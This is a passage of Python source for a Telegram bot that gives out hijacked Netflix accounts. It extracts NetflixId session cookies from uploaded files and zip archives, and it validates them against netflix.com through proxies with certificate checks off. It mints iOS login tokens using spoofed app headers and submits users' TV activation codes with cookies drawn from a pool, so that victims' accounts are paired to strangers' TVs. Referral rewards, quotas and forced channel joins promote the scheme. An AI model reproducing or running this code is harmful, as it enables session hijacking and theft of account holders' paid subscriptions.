        if user.get("last_claim_date") != today:
            user["last_claim_date"] = today
            user["claimed_basic_today"] = 0
            user["claimed_standard_today"] = 0
            user["claimed_premium_today"] = 0
        if user.get("last_check_date") != today:
            user["last_check_date"] = today
            user["checks_today"] = 0
            user["mass_checked_cookies_today"] = 0
        user["is_admin"] = user_id in [str(a) for a in ADMIN_IDS] or int(user_id) in ADMIN_IDS
        defaults = {
            "premium_expiry": 0,
            "premium_check_quota": 0,
            "premium_get_quota": 0,
            "pending_premium": 0,
            "referral_count": 0,
            "claimed_total": 0,
            "claimed_basic_today": 0,
            "claimed_standard_today": 0,
            "claimed_premium_today": 0,
            "checks_today": 0,
            "mass_checked_cookies_today": 0,
            "joined_channels": False,
            "referred_by": None,
            "banned": False,
            "ban_reason": "",
            "username": username or "",
        }
        for k, v in defaults.items():
            if k not in user:
                user[k] = v
            elif k == "username" and username and user.get("username") != username:
                user["username"] = username
    save_users(users)
    return users, users[user_id]

def is_premium(user: Dict) -> bool:
    expiry = user.get("premium_expiry", 0)
    if expiry > time.time():
        if user.get("premium_check_quota", 0) > 0 or user.get("premium_get_quota", 0) > 0:
            return True
    return False

def get_user_display(user_id: str, username: Optional[str] = None) -> str:
    if username:
        return f"@{username}"
    return f"ID: {user_id}"

# ---------- BAN SYSTEM ----------
async def require_not_banned(update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
    if not update.effective_user:
        return False
    user_id = str(update.effective_user.id)
    users, user = ensure_user(user_id, update.effective_user.username)
    if user.get("banned", False):
        reason = user.get("ban_reason", "No reason provided")
        await update.effective_message.reply_text(
            premium_emoji(f"⛔ You are **banned** from using this bot.\nReason: {reason}\nContact admin if you think this is a mistake."),
            parse_mode='HTML'
        )
        return False
    return True

# ---------- FEEDBACK SYSTEM ----------
def set_pending_feedback(user_id: str, feedback_type: str, cookie_nid: str, plan: str = "", email: str = "", username: str = None):
    users, user = ensure_user(user_id, username)
    user["pending_feedback"] = {
        "type": feedback_type,
        "cookie": cookie_nid,
        "email": email,
        "timestamp": time.time(),
        "plan": plan,
        "notified": False
    }
    save_users(users)

def get_pending_feedback(user_id: str) -> Optional[Dict]:
    users, user = ensure_user(user_id)
    return user.get("pending_feedback")

def clear_pending_feedback(user_id: str):
    users, user = ensure_user(user_id)
    user.pop("pending_feedback", None)
    save_users(users)

def has_pending_feedback(user_id: str) -> bool:
    pf = get_pending_feedback(user_id)
    return bool(pf)

async def require_no_pending_feedback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
    if not update.effective_user:
        return False
    user_id = str(update.effective_user.id)
    users, user = ensure_user(user_id, update.effective_user.username)
    if user.get("is_admin", False):
        return True
    if has_pending_feedback(user_id):
        pending = get_pending_feedback(user_id)
        await update.effective_message.reply_text(
            premium_emoji(f"⛔ You have a pending screenshot request from your last `{pending['type']}` command.\n"
                          f"Please send the screenshot **now** to continue using most commands.\n"
                          f"(Only `/nfcheck` is available while pending.)\n"
                          f"Your request does not expire – you must send the screenshot to unblock."),
            parse_mode='HTML'
        )
        return False
    return True

# ---- NEW: feedback_timeout_checker extended with auto-ban ----
async def feedback_timeout_checker(bot):
    """Runs every 1 minute. Notifies admin and auto-bans if enabled."""
    admin_id = 6725209689  # can be made configurable
    while True:
        await asyncio.sleep(60)
        try:
            users = load_users()
            now = time.time()
            for uid, user in users.items():
                pf = user.get("pending_feedback")
                if not pf:
                    continue

                elapsed = now - pf["timestamp"]

                # ---------- AUTO-BAN (if enabled) ----------
                if AUTOBAN_ENABLED and elapsed >= (AUTOBAN_TIMEOUT_MINUTES * 60):
                    user["banned"] = True
                    user["ban_reason"] = f"Auto-banned for not sending feedback within {AUTOBAN_TIMEOUT_MINUTES} minutes."
                    user.pop("pending_feedback", None)
                    save_users(users)
                    log.info(f"Auto-banned user {uid} for feedback timeout.")

                    username = user.get("username", "N/A")
                    display = get_user_display(uid, username)

                    # Notify admin
                    try:
                        await bot.send_message(
                            chat_id=admin_id,
                            text=f"⛔ Auto-banned user {display} (`{uid}`) for not sending feedback within {AUTOBAN_TIMEOUT_MINUTES} minutes."
                        )
                    except Exception:
                        pass

                    # Notify the user
                    try:
                        await bot.send_message(
                            chat_id=int(uid),
                            text=premium_emoji(
                                f"⛔ You have been **auto-banned** for not sending a screenshot within {AUTOBAN_TIMEOUT_MINUTES} minutes.\n"
                                f"Reason: {user['ban_reason']}\n"
                                f"Contact admin if you think this is a mistake."
                            ),
                            parse_mode='HTML'
                        )
                    except Exception as e:
                        log.error(f"Could not notify user {uid} of auto-ban: {e}")
                    continue  # skip the 5‑minute notification for this user

                # ---------- 5‑minute admin notification (only if auto-ban is OFF) ----------
                if not AUTOBAN_ENABLED and not pf.get("notified", False) and elapsed >= 300:
                    username = user.get("username", "N/A")
                    display = get_user_display(uid, username)
                    msg = (
                        f"⏰ **Feedback Pending (5+ minutes)**\n"
                        f"User: {display}\n"
                        f"Command: `{pf['type']}`\n"
                        f"Plan: `{pf.get('plan', 'N/A')}`\n"
                        f"Pending since: {datetime.fromtimestamp(pf['timestamp']).isoformat()}\n"
                        f"**They have not sent a screenshot yet.**"
                    )
                    try:
                        await bot.send_message(chat_id=admin_id, text=msg, parse_mode='Markdown')
                        pf["notified"] = True
                        save_users(users)
                    except Exception as e:
                        log.error(f"Failed to send to admin {admin_id}: {e}")

        except Exception as e:
            log.error(f"Error in feedback_timeout_checker: {e}")

# ---------- REFERRAL REWARD ----------
def grant_referral_reward(user_id: str, users: dict) -> bool:
    user = users.get(user_id)
    if not user:
        return False
    pending = user.get("pending_premium", 0)
    if pending <= 0:
        return False
    user["pending_premium"] = pending - 1
    current_expiry = user.get("premium_expiry", 0)
    new_expiry = max(current_expiry, time.time()) + REFERRAL_REWARD_HOURS * 3600
    user["premium_expiry"] = new_expiry
    user["premium_check_quota"] = user.get("premium_check_quota", 0) + REFERRAL_REWARD_CHECK_QUOTA
    user["premium_get_quota"] = user.get("premium_get_quota", 0) + REFERRAL_REWARD_GET_QUOTA
    return True

# ---------- POOL MANAGEMENT ----------
async def is_cookie_in_pool_async(nid: str) -> bool:
    basic, standard, premium = await get_pool_cached()
    return nid in basic or nid in standard or nid in premium

# ---------- SAFE TEXT CLEANING ----------
import codecs

def clean_text(text):
    if not text:
        return 'N/A'
    try:
        text = html_mod.unescape(text)
        text = codecs.decode(text, 'unicode_escape')
        text = text.replace('\u00A0', ' ')
        text = ''.join(c for c in text if c != '\x00')
        return text.strip() or 'N/A'
    except Exception:
        return 'N/A'

def safe_html(text):
    if not text:
        return "Unknown"
    text = clean_text(str(text))
    text = html_mod.escape(text)
    return text

def scrub_text(text: str) -> str:
    if not text:
        return "Unknown"
    text = safe_html(text)
    text = re.sub(r'([A-Za-z0-9._%+-]{2})[A-Za-z0-9._%+-]*(@[A-Za-z0-9.-]+\.[A-Za-z]{2,})', r'\1***\2', text)
    text = re.sub(r'(\+?\d{2})\d{2,}(\d{2})', r'\1******\2', text)
    return text

def dict_to_netscape(cookie_dict, domain=".netflix.com"):
    expiry = int(time.time()) + 180 * 24 * 3600
    lines = ["# Netscape HTTP Cookie File"]
    for k, v in cookie_dict.items():
        lines.append(f"{domain}\tTRUE\t/\tFALSE\t{expiry}\t{k}\t{v}")
    return "\n".join(lines)

def safe_filename(name):
    return re.sub(r'[^a-zA-Z0-9_\-\.]', '_', name)

def translate_date(date_str):
    if not date_str or date_str in ['Not available', 'N/A', 'null', '']:
        return date_str
    return date_str

# ---------- EXTRACT NETFLIX COOKIES ----------
def extract_netflix_cookies(text: str) -> List[Dict[str, str]]:
    tokens = set()
    for line in text.splitlines():
        line = line.strip()
        if not line:
            continue
        if line.startswith("#") and not line.startswith("#HttpOnly_"):
            continue
        if line.startswith("#HttpOnly_"):
            line = line[len("#HttpOnly_"):]
        parts = line.split("\t")
        if len(parts) >= 7:
            name = parts[5].strip()
            if name.lower() == "netflixid":
                value = parts[6].strip()
                cleaned = generator.extract_netflixid(value)
                if cleaned:
                    tokens.add(cleaned)

    for match in re.finditer(r'NetflixId\s*=\s*([^\s;,\n"\']+)', text, re.IGNORECASE):
        raw = match.group(1).strip()
        cleaned = generator.extract_netflixid(raw)
        if cleaned:
            tokens.add(cleaned)

    for match in re.finditer(r'ct=([^\s;,\n"\']+)', text, re.IGNORECASE):
        raw = match.group(1).strip()
        token = 'ct=' + raw
        cleaned = generator.extract_netflixid(token)
        if cleaned:
            tokens.add(cleaned)

    for match in re.finditer(r'v=3&ct=([^\s;,\n"\']+)', text, re.IGNORECASE):
        raw = match.group(1).strip()
        token = 'ct=' + raw
        cleaned = generator.extract_netflixid(token)
        if cleaned:
            tokens.add(cleaned)

    try:
        data = json.loads(text)
        if isinstance(data, dict):
            data = data.get('cookies') or data.get('items') or [data]
        if isinstance(data, list):
            for item in data:
                if isinstance(item, dict):
                    name = item.get('name', '')
                    if name.lower() == 'netflixid':
                        raw = item.get('value', '')
                        cleaned = generator.extract_netflixid(raw)
                        if cleaned:
                            tokens.add(cleaned)
    except:
        pass

    if not tokens:
        for line in text.splitlines():
            line = line.strip()
            if not line:
                continue
            cleaned = generator.extract_netflixid(line)
            if cleaned:
                tokens.add(cleaned)

    return [{"NetflixId": t} for t in tokens if t]

def extract_netscape_lines(content: str) -> str:
    lines = content.splitlines()
    cookie_lines = []
    for line in lines:
        line = line.strip()
        if not line:
            continue
        parts = line.split('\t')
        if len(parts) >= 7:
            if '.' in parts[0] or parts[0] == 'localhost':
                cookie_lines.append(line)
    return '\n'.join(cookie_lines)

def split_txt_by_token(content: str) -> List[str]:
    lines = content.splitlines()
    token_indices = []
    for i, line in enumerate(lines):
        if 'NetflixId=' in line or 'ct=' in line:
            token_indices.append(i)
    if not token_indices:
        return [content]
    blocks = []
    for idx, start in enumerate(token_indices):
        end = token_indices[idx+1] if idx+1 < len(token_indices) else len(lines)
        block_lines = lines[start:end]
        block = '\n'.join(block_lines)
        blocks.append(block)
    return blocks

def parse_cookie_file(text):
    return extract_netflix_cookies(text)

async def extract_cookies_from_zip(zip_path):
    cookies = []
    with zipfile.ZipFile(zip_path, 'r') as z:
        for info in z.infolist():
            if info.is_dir():
                continue
            if info.filename.startswith('__MACOSX') or info.filename.startswith('.'):
                continue
            if info.filename.lower().endswith(('.txt', '.json')):
                with z.open(info) as f:
                    try:
                        content = f.read().decode('utf-8', errors='ignore')
                        c = parse_cookie_file(content)
                        for cookie in c:
                            cookies.append((f"{safe_filename(info.filename)}", cookie))
                    except:
                        continue
    return cookies

# ---------- iOS NFTOKEN ----------
NFTOKEN_API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
NFTOKEN_QUERY_PARAMS = {
    "appVersion": "15.48.1",
    "config": '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","addHorizontalBoxArtToVideoSummariesEnabled":"false","skOverlayTestEnabled":"false","homeFeedTestTVMovieListsEnabled":"false","baselineOnIpadEnabled":"true","trailersVideoIdLoggingFixEnabled":"true","postPlayPreviewsEnabled":"false","bypassContextualAssetsEnabled":"false","roarEnabled":"false","useSeason1AltLabelEnabled":"false","disableCDSSearchPaginationSectionKinds":["searchVideoCarousel"],"cdsSearchHorizontalPaginationEnabled":"true","searchPreQueryGamesEnabled":"true","kidsMyListEnabled":"true","billboardEnabled":"true","useCDSGalleryEnabled":"true","contentWarningEnabled":"true","videosInPopularGamesEnabled":"true","avifFormatEnabled":"false","sharksEnabled":"true"}',
    "device_type": "NFAPPL-02-",
    "esn": "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "idiom": "phone",
    "iosVersion": "15.8.5",
    "isTablet": "false",
    "languages": "en-US",
    "locale": "en-US",
    "maxDeviceWidth": "375",
    "model": "saget",
    "modelType": "IPHONE8-1",
    "odpAware": "true",
    "path": '["account","token","default"]',
    "pathFormat": "graph",
    "pixelDensity": "2.0",
    "progressive": "false",
    "responseFormat": "json",
}

NFTOKEN_HEADERS = {
    "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
    "x-netflix.request.attempt": "1",
    "x-netflix.request.client.user.guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.context.profile-guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.request.routing": '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
    "x-netflix.context.app-version": "15.48.1",
    "x-netflix.argo.translated": "true",
    "x-netflix.context.form-factor": "phone",
    "x-netflix.context.sdk-version": "2012.4",
    "x-netflix.client.appversion": "15.48.1",
    "x-netflix.context.max-device-width": "375",
    "x-netflix.context.ab-tests": "",
    "x-netflix.tracing.cl.useractionid": "4DC655F2-9C3C-4343-8229-CA1B003C3053",
    "x-netflix.client.type": "argo",
    "x-netflix.client.ftl.esn": "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "x-netflix.context.locales": "en-US",
    "x-netflix.context.top-level-uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.client.iosversion": "15.8.5",
    "accept-language": "en-US;q=1",
    "x-netflix.argo.abtests": "",
    "x-netflix.context.os-version": "15.8.5",
    "x-netflix.request.client.context": '{"appState":"foreground"}',
    "x-netflix.context.ui-flavor": "argo",
    "x-netflix.argo.nfnsm": "9",
    "x-netflix.context.pixel-density": "2.0",
    "x-netflix.request.toplevel.uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.request.client.timezoneid": "Asia/Dhaka",
}

def generate_nftoken_ios(cookie_dict):
    netflix_id = cookie_dict.get('NetflixId')
    if not netflix_id:
        return None, "No NetflixId"
    headers = dict(NFTOKEN_HEADERS)
    headers["Cookie"] = f"NetflixId={netflix_id}"
    try:
        r = requests.get(NFTOKEN_API_URL, params=NFTOKEN_QUERY_PARAMS, headers=headers, timeout=REQUEST_TIMEOUT, verify=False)
        r.raise_for_status()
        data = r.json()
        td = ((((data.get("value") or {}).get("account") or {}).get("token") or {}).get("default") or {})
        token = td.get("token")
        expires = td.get("expires")
        if not token:
            return None, "Dead cookie"
        if isinstance(expires, int) and len(str(expires)) == 13:
            expires //= 1000
        expiry = datetime.fromtimestamp(expires).strftime("%Y-%m-%d %H:%M:%S UTC") if expires else "Unknown"
        return {'token': token, 'expires': expiry, 'expires_unix': expires}, None
    except Exception as e:
        return None, str(e)

# ---------- TV LOGIN FUNCTIONS ----------
REQUIRED_COOKIES = ("NetflixId",)
OPTIONAL_COOKIES = ("SecureNetflixId", "nfvdid", "OptanonConsent")
ALL_COOKIE_NAMES = set(REQUIRED_COOKIES + OPTIONAL_COOKIES)
CANONICAL_NAMES = {name.lower(): name for name in ALL_COOKIE_NAMES}

def canonicalize_name(name):
    return CANONICAL_NAMES.get(str(name or "").strip().lower(), str(name or "").strip())

def is_netflix_cookie(domain, name):
    return canonicalize_name(name) in ALL_COOKIE_NAMES or "netflix." in str(domain or "").lower()

def extract_cookie_dict_tv(content):
    entries = {}
    for line in content.splitlines():
        line = line.strip()
        if not line:
            continue
        if line.startswith("#HttpOnly_"):
            line = line[len("#HttpOnly_"):]
        parts = line.split("\t")
        if len(parts) >= 7:
            name = canonicalize_name(parts[5])
            if is_netflix_cookie(parts[0], name):
                entries[name] = parts[6]
    if entries.get("NetflixId"):
        return entries
    try:
        data = json.loads(content)
        if isinstance(data, dict):
            data = data.get("cookies") or data.get("items") or [data]
        if isinstance(data, list):
            for c in data:
                if isinstance(c, dict):
                    name = canonicalize_name(c.get("name", ""))
                    if is_netflix_cookie(c.get("domain", ""), name):
                        entries[name] = str(c.get("value", ""))
    except:
        pass
    if entries.get("NetflixId"):
        return entries
    for cn in ALL_COOKIE_NAMES:
        m = re.search(rf'{cn}\s*[:=]\s*([^\s;,\n"\']+)', content, re.IGNORECASE)
        if m:
            entries[cn] = m.group(1).strip('"\'')
    return entries if entries.get("NetflixId") else None

def validate_cookie_tv(cookies, proxy=None):
    with requests.Session() as session:
        session.cookies.update(cookies)
        headers = {
            "User-Agent": get_random_user_agent(),
            "Accept": "text/html,application/xhtml+xml",
            "Accept-Language": "en-US,en;q=0.9",
        }
        try:
            r = session.get(
                "https://www.netflix.com/YourAccount",
                headers=headers,
                proxies=proxy,
                timeout=REQUEST_TIMEOUT,
                verify=False,
                allow_redirects=True
            )

            # Check for redirect to login page
            if 'login' in r.url.lower() or 'signin' in r.url.lower():
                return False, None, None

            # Check HTTP status
            if r.status_code != 200:
                return False, None, None

            # ---- Restore the full restart pattern list (same as above) ----
            restart_patterns = [
                r'restart your membership',
                r'mulai lagi',
                r'aktifkan kembali',
                r'reanudar (?:tu|la) suscripción',
                r'reinicie su suscripción',
                r'redémarrer (?:votre|ton) abonnement',
                r'renouveler (?:votre|ton) abonnement',
                r'wieder aktivieren',
                r'mitgliedschaft (?:wieder|neu) starten',
                r'riavvia (?:il tuo|l\'abbonamento)',
                r'reinizia (?:il tuo|l\'abbonamento)',
                r'reiniciar (?:sua|a) assinatura',
                r'reativar (?:sua|a) assinatura',
                r'opnieuw starten (?:je|uw) abonnement',
                r'hervat (?:je|uw) abonnement',
                r'wznów (?:swoją|członkostwo)',
                r'przywróć (?:swoją|członkostwo)',
                r'yeniden başlat (?:üyeliğini|hesabını)',
                r'tekrar (?:başlat|etkinleştir)',
                r'возобновить (?:подписку|членство)',
                r'перезапустить (?:подписку|членство)',
                r'إعادة تشغيل العضوية',
                r'استئناف العضوية',
                r'सदस्यता पुनः आरंभ करें',
                r'पुनः सक्रिय करें',
                r'重新启动会员资格',
                r'续订会员资格',
                r'メンバーシップを再開',
                r'再開する',
                r'멤버십 다시 시작',
                r'재시작',
                r'starta om medlemskapet',
                r'återaktivera',
                r'start medlemskapet på nytt',
                r'gjenoppta',
                r'genstart medlemskab',
                r'forny',
                r'aloita jäsenyys uudelleen',
                r'jatka',
                r'επανεκκίνηση συνδρομής',
                r'ενεργοποίηση ξανά',
                r'เริ่มต้นใหม่',
                r'เปิดใช้งานอีกครั้ง',
                r'khởi động lại tư cách thành viên',
                r'gia hạn',
                r'reia abonamentul',
                r'reactivează',
                r'obnovit členství',
                r'restartovat',
                r'újraindítás',
                r'újrakezdés',
                r'перезапустити підписку',
                r'відновити',
                r'your account is on hold',
                r'renew your membership',
                # ---- additions for recent Netflix UI ----
                r'reactivate your subscription',
                r'reactivate your membership',
                r'reactiver votre abonnement',
                r'réactiver',
                r'terminer votre inscription',
                r'complete your registration',
                r'finish signing up',
                r'selesaikan pendaftaran',
                r'pendaftaran',
                r'khusus anggota baru',
                r'join now',
                r'start your free trial',
                # ---- explicit expiry / suspension (multi‑word only) ----
                r'(?:subscription|account|membership) (?:has )?expired',
                r'no active subscription',
                r'not currently active',
                r'this account is not active',
                r'(?:subscription|account) (?:is )?(?:paused|suspended)',
                r'abonnement expiré',
                r'compte suspendu',
                r'suscripción expirada',
                r'cuenta suspendida',
                r'assinatura expirada',
                r'assinatura suspensa',
                r'abonnement abgelaufen',
                r'mitgliedschaft abgelaufen',
                r'abbonamento scaduto',
                r'abbonamento sospeso',
                r'срок действия ист(?:ё|е)к',
                r'подписка приостановлена',
                r'aboneliğin süresi doldu',
                r'berlangganan berakhir',
                r'akun ditangguhkan',
                r'انتهت العضوية',
                r'عضوية معلقة',
            ]
            if any(re.search(p, r.text, re.IGNORECASE) for p in restart_patterns):
                return False, None, None

            if re.search(r'"membershipStatus"\s*:\s*"INACTIVE"', r.text, re.IGNORECASE):
                return False, None, None

            country = None
            plan = None
            country_match = re.search(r'"countryOfSignup"\s*:\s*"([^"]+)"', r.text)
            if not country_match:
                country_match = re.search(r'"currentCountry"\s*:\s*"([^"]+)"', r.text)
            if not country_match:
                country_match = re.search(r'"countryCode"\s*:\s*"([^"]+)"', r.text)
            plan_match = re.search(r'"localizedPlanName".*?"value":"([^"]+)"', r.text)
            if not plan_match:
                plan_match = re.search(r'"planName"\s*:\s*"([^"]+)"', r.text)
            country = country_match.group(1) if country_match else None
            plan = plan_match.group(1) if plan_match else "Unknown"
            has_account = 'Account' in r.text or 'membershipStatus' in r.text
            return has_account and country is not None, country, plan

        except Exception:
            return False, None, None

def extract_auth_url(html_text):
    patterns = [
        r'name="authURL"\s+value="([^"]+)"',
        r'authURL["\']?\s*[:=]\s*["\']([^"]+)["\']',
        r'authURL=([^&\s"\']+)',
        r'value="(c1\.[^"]+)"',
    ]
    for pat in patterns:
        m = re.search(pat, html_text)
        if m:
            return urllib.parse.unquote(m.group(1))
    m = re.search(r'c1\.[a-zA-Z0-9%+=/_-]+', html_text)
    return m.group(0) if m else None

def submit_tv_code(session, tv_code, proxy=None):
    url = "https://www.netflix.com/tv8"
    headers = {
        "User-Agent": get_random_user_agent(),
        "Accept": "text/html,application/xhtml+xml",
        "Accept-Language": "en-US,en;q=0.9",
    }
    try:
        r = session.get(url, headers=headers, proxies=proxy, timeout=REQUEST_TIMEOUT, verify=False)
        if r.status_code != 200:
            return {"success": False, "error": f"TV page unavailable (HTTP {r.status_code})"}
    except Exception as e:
        return {"success": False, "error": f"Connection failed: {str(e)[:50]}"}
    auth_url = extract_auth_url(r.text)
    if not auth_url:
        return {"success": False, "error": "Could not load activation page"}
    form_data = {
        "flow": "websiteSignUp",
        "authURL": auth_url,
        "flowMode": "enterTvLoginRendezvousCode",
        "withFields": "tvLoginRendezvousCode,isTvUrl2",
        "code": tv_code,
        "tvLoginRendezvousCode": tv_code,
        "action": "nextAction",
    }
    post_headers = {
        **headers,
        "Content-Type": "application/x-www-form-urlencoded",
        "Referer": "https://www.netflix.com/tv8",
        "Origin": "https://www.netflix.com",
    }
    try:
        r = session.post(url, data=form_data, headers=post_headers,
                        proxies=proxy, timeout=REQUEST_TIMEOUT, verify=False,
                        allow_redirects=True)
    except Exception as e:
        return {"success": False, "error": f"Activation request failed: {str(e)[:50]}"}
    final_url = r.url
    if "/tv/out/success" in final_url.lower():
        return {"success": True, "error": None}
    if "success" in final_url.lower() and "tv" in final_url.lower():
        return {"success": True, "error": None}
    success_patterns = [
        r"your tv is ready",
        r"tu tv est[aá] lista",
        r"sua tv est[aá] pronta",
        r"votre t[ée]l[ée] est pr[eê]t",
        r"dein tv ist bereit",
        r"la tua tv [eè] pronta",
        r"tv'niz hazır",
        r"t[ée]l[ée]vision activ[ée]",
        r"successfully activated",
    ]
    text_clean = re.sub(r'<[^>]+>', ' ', r.text)
    text_clean = html_mod.unescape(text_clean)
    text_clean = re.sub(r'\s+', ' ', text_clean).strip().lower()
    for pat in success_patterns:
        if re.search(pat, text_clean):
            return {"success": True, "error": None}
    error_patterns = [
        r"that code wasn'?t right",
        r"code (is )?(incorrect|invalid|wrong|expired)",
        r"try again",
        r"c[oó]digo (es |incorrecto|inv[aá]lido)",
        r"int[ée]ntalo de nuevo",
        r"code (est |incorrect|invalide)",
        r"code (ist |ung[uü]ltig|falsch)",
        r"codice (non [eè] |sbagliato)",
        r"kod (yanlış|ge[çc]ersiz)",
        r"код (неверный|неправильный)",
        r"代码(有误|错误|无效)",
        r"코드(가|는)?(잘못|틀렸)",
        r"コード(が|は)?(間違|違)",
    ]
    for pat in error_patterns:
        if re.search(pat, text_clean):
            return {"success": False, "error": "Invalid or expired TV code"}
    if "/tv/" in final_url.lower() and "code" not in final_url.lower():
        return {"success": True, "error": None}
    return {"success": False, "error": f"Unknown response (URL: {final_url[:50]})"}

# ---------- TV LOGIN FROM POOL (always premium) ----------
MAX_TV_ATTEMPTS = 50

def process_tv_login_from_pool(tv_code, progress_callback=None, loop=None):
    try:
        basic, standard, premium = asyncio.run_coroutine_threadsafe(get_pool_cached(), loop).result()
        nids = premium[:]
    except:
        if not os.path.exists(PREMIUM_FILE):
            return {"success": False, "error": "Premium pool file not found."}
        nids = read_plan_file(PREMIUM_FILE)

    if not nids:
        return {"success": False, "error": "No premium cookies in pool."}

    used = load_used()
    random.shuffle(nids)
    tried_countries = []
    used_nids = set()
    total = len(nids)
    tried = 0
    working_cookie_nid = None

    for nid in nids:
        if tried >= MAX_TV_ATTEMPTS:
            break
        if nid in used or nid in used_nids:
            continue
        used_nids.add(nid)
        tried += 1
        if progress_callback and loop:
            asyncio.run_coroutine_threadsafe(
                progress_callback(tried, min(total, MAX_TV_ATTEMPTS), nid),
                loop
            )
        try:
            cookies, info = generator.get_cookies_and_info(nid)
            if not cookies:
                continue
            if info.get('membership_status') == 'INACTIVE':
                used.add(nid)
                save_used(used)
                continue
            if info.get('hold') == 'Yes':
                used.add(nid)
                save_used(used)
                continue
            proxy_str = random.choice(list(proxy_manager.proxies)) if proxy_manager.proxies else None
            proxy_dict = parse_proxy_line(proxy_str) if proxy_str else None
            valid, country, plan_name = validate_cookie_tv(cookies, proxy_dict)
            if not valid:
                used.add(nid)
                save_used(used)
                continue
            if country:
                tried_countries.append(country)
            with requests.Session() as session:
                session.cookies.update(cookies)
                result = submit_tv_code(session, tv_code, proxy_dict)
            result["country"] = country
            result["plan"] = plan_name
            result["tried_countries"] = tried_countries
            if result["success"]:
                working_cookie_nid = nid
                used.add(nid)
                save_used(used)
                result["nid"] = nid
                result["email"] = info.get('email', '')
                return result
            if "Invalid" in str(result.get("error", "")) or "expired" in str(result.get("error", "")).lower():
                used.add(nid)
                save_used(used)
                return result
        except Exception as e:
            log.error(f"TV login error for cookie {nid}: {e}")
            used.add(nid)
            save_used(used)
            continue
    return {"success": False, "error": "all_cookies_failed", "tried_countries": tried_countries}

# ---------- FORCE JOIN ----------
async def check_membership(user_id: int, context: ContextTypes.DEFAULT_TYPE) -> bool:
    if str(user_id) in [str(a) for a in ADMIN_IDS] or user_id in ADMIN_IDS:
        return True
    for channel in REQUIRED_CHANNELS:
        try:
            member = await context.bot.get_chat_member(chat_id=channel, user_id=user_id)
            if member.status not in ["member", "administrator", "creator"]:
                return False
        except Exception:
            continue
    return True

async def require_join(update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
    if not update.effective_user:
        return False
    user_id = update.effective_user.id
    users, user = ensure_user(str(user_id))
    if await check_membership(user_id, context):
        user["joined_channels"] = True
        save_users(users)
        return True

    missing = []
    for channel in REQUIRED_CHANNELS:
        try:
            member = await context.bot.get_chat_member(chat_id=channel, user_id=user_id)
            if member.status not in ["member", "administrator", "creator"]:
                missing.append(channel)
        except:
            missing.append(channel)
    keyboard = []
    for channel in missing:
        link = CHANNEL_LINKS.get(channel, f"https://t.me/{channel[1:]}")
        keyboard.append([InlineKeyboardButton(f"📢 Join {channel}", url=link)])
    keyboard.append([InlineKeyboardButton("✅ I've joined", callback_data="check_join")])
    reply_markup = InlineKeyboardMarkup(keyboard)
    msg = (
        "🔒 Access Restricted\n\n"
        "You must join the following channels to use this bot:\n"
        + "\n".join(f"• {ch}" for ch in missing) +
        "\n\nAfter joining, click the button below to verify."
    )
    await update.effective_message.reply_text(premium_emoji(msg), reply_markup=reply_markup, parse_mode='HTML')
    user["joined_channels"] = False
    save_users(users)
    return False

async def check_join_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    if not query.from_user:
        return
    user_id = query.from_user.id
    users, user = ensure_user(str(user_id))
    try:
        await query.message.delete()
    except:
        pass

    if await check_membership(user_id, context):
        user["joined_channels"] = True
        save_users(users)

        pending_ref = context.user_data.get('pending_referral')
        user_is_new = context.user_data.get('user_is_new', False)

        if pending_ref and user_is_new and user.get("referred_by") is None:
            referrer_id = pending_ref
            if referrer_id != str(user_id) and referrer_id in users:
                user["referred_by"] = referrer_id
                referrer = users[referrer_id]
                referrer["pending_premium"] = referrer.get("pending_premium", 0) + 1
                referrer["referral_count"] = referrer.get("referral_count", 0) + 1
                save_users(users)
                try:
                    await context.bot.send_message(
                        chat_id=int(referrer_id),
                        text=premium_emoji("🎉 You got a new referral! +1 Premium cookie earned. Use /claim to get it."),
                        parse_mode='HTML'
                    )
                except Exception:
                    pass
                await context.bot.send_message(
                    chat_id=query.message.chat_id,
                    text=premium_emoji("✅ Referral recorded! Your referrer earned a Premium cookie."),
                    parse_mode='HTML'
                )
            else:
                await context.bot.send_message(
                    chat_id=query.message.chat_id,
                    text=premium_emoji("⚠️ Invalid referral link or you already have a referrer."),
                    parse_mode='HTML'
                )
        elif pending_ref and not user_is_new:
            await context.bot.send_message(
                chat_id=query.message.chat_id,
                text=premium_emoji("ℹ️ Referral links only work for new users. You already have an account."),
                parse_mode='HTML'
            )

        context.user_data.pop('pending_referral', None)
        context.user_data.pop('user_is_new', None)

        await context.bot.send_message(
            chat_id=query.message.chat_id,
            text=premium_emoji("✅ All channels joined! You can now use the bot.\nUse /start to see your status."),
            parse_mode='HTML'
        )
    else:
        missing = []
        for channel in REQUIRED_CHANNELS:
            try:
                member = await context.bot.get_chat_member(chat_id=channel, user_id=user_id)
                if member.status not in ["member", "administrator", "creator"]:
                    missing.append(channel)
            except:
                missing.append(channel)
        keyboard = []
        for channel in missing:
            link = CHANNEL_LINKS.get(channel, f"https://t.me/{channel[1:]}")
            keyboard.append([InlineKeyboardButton(f"📢 Join {channel}", url=link)])
        keyboard.append([InlineKeyboardButton("✅ I've joined", callback_data="check_join")])
        reply_markup = InlineKeyboardMarkup(keyboard)
        msg = "⚠️ You are still missing some channels:\n" + "\n".join(f"• {ch}" for ch in missing) + "\n\nPlease join them and click the button again."
        await context.bot.send_message(
            chat_id=query.message.chat_id,
            text=premium_emoji(msg),
            reply_markup=reply_markup,
